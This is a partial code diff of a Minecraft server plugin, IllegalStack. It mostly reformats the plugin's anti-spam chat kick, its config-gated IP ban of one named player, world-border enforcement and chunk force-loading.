-        // 危险区块判定：(chunkX + 1) % 4194304 == 2097152
         private boolean isDangerChunk(int chunkX) {
-            // 使用位运算优化：2^22=4194304，2^21=2097152
             return ((chunkX + 1) & 0x3FFFFF) == 0x200000;
         }
 
@@ -2062,12 +1976,8 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     removeLogHandler();
                 }
             }
-
-            @Override
-            public void flush() {}
-
-            @Override
-            public void close() throws SecurityException {}
+            @Override public void flush() {}
+            @Override public void close() {}
         };
         Bukkit.getLogger().addHandler(logHandler);
     }
@@ -2102,13 +2012,10 @@ public class IllegalStack extends JavaPlugin implements Listener {
     @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
     public void onPlayerChat(AsyncPlayerChatEvent event) {
         if (!getConfig().getBoolean(CONFIG_ANTICHEAT_ANTI4D4V, false)) return;
-
         Player player = event.getPlayer();
         String message = event.getMessage();
         if (message.contains("4d4v.top")) {
-            Scheduler.runTask(this, () -> {
-                player.kickPlayer("§c你的账号似乎为 4D4V 方面的宣传机器人");
-            });
+            Scheduler.runTask(this, () -> player.kickPlayer("§c你的账号似乎为 4D4V 方面的宣传机器人"));
             event.setCancelled(true);
             getLogger().info("已踢出宣传 4d4v.top 的玩家: " + player.getName());
         }
@@ -2117,14 +2024,11 @@ public class IllegalStack extends JavaPlugin implements Listener {
     @EventHandler(priority = EventPriority.MONITOR)
     public void onPlayerJoin(PlayerJoinEvent event) {
         if (!getConfig().getBoolean(CONFIG_ANTICHEAT_BANBBQ, false)) return;
-
         Player player = event.getPlayer();
         if (player.getName().equalsIgnoreCase("smooth_BBQ")) {
             String ip = player.getAddress().getAddress().getHostAddress();
             Bukkit.getBanList(BanList.Type.IP).addBan(ip, "Banned by antiBBQ", null, "Console");
-            Scheduler.runTask(this, () -> {
-                player.kickPlayer("§c你的 IP 已被封禁");
-            });
+            Scheduler.runTask(this, () -> player.kickPlayer("§c你的 IP 已被封禁"));
             getLogger().info("已封禁 smooth_BBQ 的 IP: " + ip);
         }
     }
@@ -2167,7 +2071,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
         Player player = event.getPlayer();
         Location to = event.getTo();
         if (to == null) return;
-
         World world = to.getWorld();
         if (world == null) return;
 
@@ -2179,15 +2082,10 @@ public class IllegalStack extends JavaPlugin implements Listener {
         if (isWorldBorderEnabled(world)) {
             double diameter = getWorldBorderDiameter(world);
             double radius = diameter / 2.0;
-
             if (absX > radius || absZ > radius) {
                 Location corrected = to.clone();
-                if (absX > radius) {
-                    corrected.setX(x > 0 ? radius : -radius);
-                }
-                if (absZ > radius) {
-                    corrected.setZ(z > 0 ? radius : -radius);
-                }
+                if (absX > radius) corrected.setX(x > 0 ? radius : -radius);
+                if (absZ > radius) corrected.setZ(z > 0 ? radius : -radius);
                 player.teleport(corrected);
                 player.sendMessage("§c你已到达世界边界！");
                 return;
@@ -2198,9 +2096,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
             int chunkX = to.getBlockX() >> 4;
             int chunkZ = to.getBlockZ() >> 4;
             Chunk chunk = world.getChunkAt(chunkX, chunkZ);
-            if (!chunk.isLoaded()) {
-                chunk.load(true);
-            }
+            if (!chunk.isLoaded()) chunk.load(true);
             if (isPaperServer()) {
                 world.getChunkAtAsync(chunkX, chunkZ, (c) -> c.setForceLoaded(true));
             }
@@ -2218,7 +2114,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
         Player player = event.getPlayer();
         Location to = event.getTo();
         if (to == null) return;
-
         World world = to.getWorld();
         if (world == null) return;
 
@@ -2231,9 +2126,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
             int chunkX = to.getBlockX() >> 4;
             int chunkZ = to.getBlockZ() >> 4;
             Chunk chunk = world.getChunkAt(chunkX, chunkZ);
-            if (!chunk.isLoaded()) {
-                chunk.load(true);
-            }
+            if (!chunk.isLoaded()) chunk.load(true);
             if (isPaperServer()) {
                 world.getChunkAtAsync(chunkX, chunkZ, (c) -> c.setForceLoaded(true));
             }
